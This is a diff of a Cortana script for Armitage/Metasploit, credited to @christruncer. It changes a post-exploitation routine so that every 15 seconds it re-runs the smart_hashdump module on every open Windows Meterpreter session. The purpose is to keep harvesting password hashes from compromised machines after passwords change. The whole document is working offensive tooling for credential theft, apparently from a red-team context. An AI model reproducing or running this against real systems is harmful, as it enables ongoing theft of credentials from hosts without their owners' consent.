@@ -2,7 +2,7 @@
 # Cortana Script by @christruncer
 # This script is for dumping hashes and continuing to dump
 # hashes in the event passwords are changed
-# Created: 2/18/2013      Edited: 2/19/2013
+# Created: 2/18/2013      Edited: 2/21/2013
 ###############################################################
 
 on session_open {
@@ -18,5 +18,10 @@ on session_open {
 }
 
 on heartbeat_15s {
-	post("windows/gather/smart_hashdump", $1);
+	foreach $sid (session_ids()) {
+		if (-iswinmeterpreter $sid) {
+			println("Re-dumped Hashes");
+			post("windows/gather/smart_hashdump", $sid);
+		}
+	}
 }
